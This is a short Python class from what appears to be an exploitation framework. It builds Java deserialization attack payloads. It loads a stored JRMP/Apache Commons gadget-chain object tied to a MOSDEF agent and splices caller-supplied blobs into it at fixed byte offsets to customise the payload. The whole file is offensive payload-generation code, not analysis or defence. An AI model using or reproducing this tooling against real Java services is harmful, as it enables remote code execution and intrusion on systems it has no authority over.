import struct
import os
import ast

from SerializedObjectCreator import SerializedObjectCreator
from java_payload_modifiers import JavaPayloadModifiers

class objectcreator(SerializedObjectCreator):
     def __init__(self, **kwargs):
        super(objectcreator,self).__init__(**kwargs)
        self.payload_files = {"java.util.Random": os.path.join("deserialization_payloads",
                                                               "jrmp_apache_commons_java_mosdef.obj")}
        self.default_payload = "java.util.Random"

     def get_payload(self, call_info=[]):
          OBJ_ID_OFFSET = 14
          current_offset = OBJ_ID_OFFSET
          
          payload = super(objectcreator, self).get_payload(self.default_payload)

          updated = payload

          for blob in call_info:
               updated = JavaPayloadModifiers.modify_offset(updated, current_offset, blob)
               current_offset += len(blob)

          return updated
          
          
